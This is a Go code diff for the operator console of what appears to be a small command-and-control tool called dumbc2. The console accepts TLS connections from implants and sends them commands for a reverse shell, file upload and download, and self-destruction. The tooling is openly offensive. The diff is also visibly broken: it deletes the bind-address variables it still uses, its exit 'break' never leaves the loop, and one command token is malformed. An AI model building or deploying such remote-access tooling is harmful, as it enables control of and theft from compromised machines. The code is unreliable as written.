@@ -1,44 +1,19 @@
 package useri
 
 import (
+	"fmt"
 	"github.com/go-errors/errors"
 	"github.com/hashicorp/yamux"
 	"github.com/kmahyyg/dumbc2/transport"
 	"github.com/kmahyyg/dumbc2/utils"
-	"github.com/manifoldco/promptui"
 	"log"
-	"net"
-	"strconv"
+	"strings"
 	"time"
 )
 
 func StartServer(){
 	allIPs := utils.GetAllIPs()
-	prpt_ip := promptui.Select{
-		Label: "Select Bind IP: ",
-		Items: allIPs,
-	}
-	_, lres, err := prpt_ip.Run()
-
-	if err != nil {
-		log.Fatal("Internal Error.")
-	}
-
-	prpt_port := promptui.Prompt{
-		Label: "Bind Port: ",
-		Validate: func(portipt string) error {
-			data, err := strconv.Atoi(portipt)
-			if err != nil || data < 1 || data > 65534 {
-				return errors.New("Input Port Error.")
-			}
-			return nil
-		},
-	}
-
-	lport, err := prpt_port.Run()
-	if err != nil {
-		log.Fatalln("Internal Error.")
-	}
+	//todo: argparse instead
 
 	fladdr := lres + ":" + lport
     lbserver, err := transport.TLSServerBuilder(fladdr, false)
@@ -50,23 +25,64 @@ func StartServer(){
 				continue
 			}
 			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
-			sess, err := yamux.Server(conn, nil)
+			sess, err := yamux.Client(conn, nil)
 			if err != nil {
 				log.Println(err)
 				continue
 			}
-			stream, err := sess.Accept()
-			if err != nil {
-				log.Println(err)
-				continue
-			}
-			handleClient(stream)
+			handleClient(sess)
 		} else {
 			log.Fatalln("Failed to bind.")
 		}
 	}
 }
 
-func handleClient(stream net.Conn){
-	// todo: full interactive pty
+
+func printHelp(){
+	fmt.Println(
+`
+Usage: 
+bash = Get Shell (Non-interactive)
+upload <Source File Path> <Destination File Path> = Upload file
+download <Source File Path> <Destination File Path> = Download file
+boom = Self-Destroy
+exit = Close Program
+help = Show This Message
+`)
+}
+
+func handleClient(sess *yamux.Session){
+	// start as tls server, means it's a reverse shell
+	// if mux, we are working as server.
+	stream, err := sess.Open()
+	printHelp()
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println("Connection established.")
+	fmt.Println("Commands: upload, download, boom, bash, exit, help.\n")
+	for true {
+		fmt.Printf("[SERVER] %s [>_] $ ",stream.RemoteAddr().String())
+		useript := utils.ReadUserInput()
+		useriptD := strings.Split(useript, " ")
+		switch useriptD[0] {
+		case "upload":
+			stream.Write([]byte("$UPLD$"))
+		case "download":
+			stream.Write([]byte("$DWLD$"))
+		case "boom":
+			stream.Write([]byte("$BOOM$"))
+			break
+		case "bash":
+			stream.Write([]byte("$BASH"))
+		case "exit":
+			break
+		case "help":
+			fallthrough
+		default:
+			printHelp()
+		}
+	}
+	_ = stream.Close()
+	_ = sess.Close()
 }
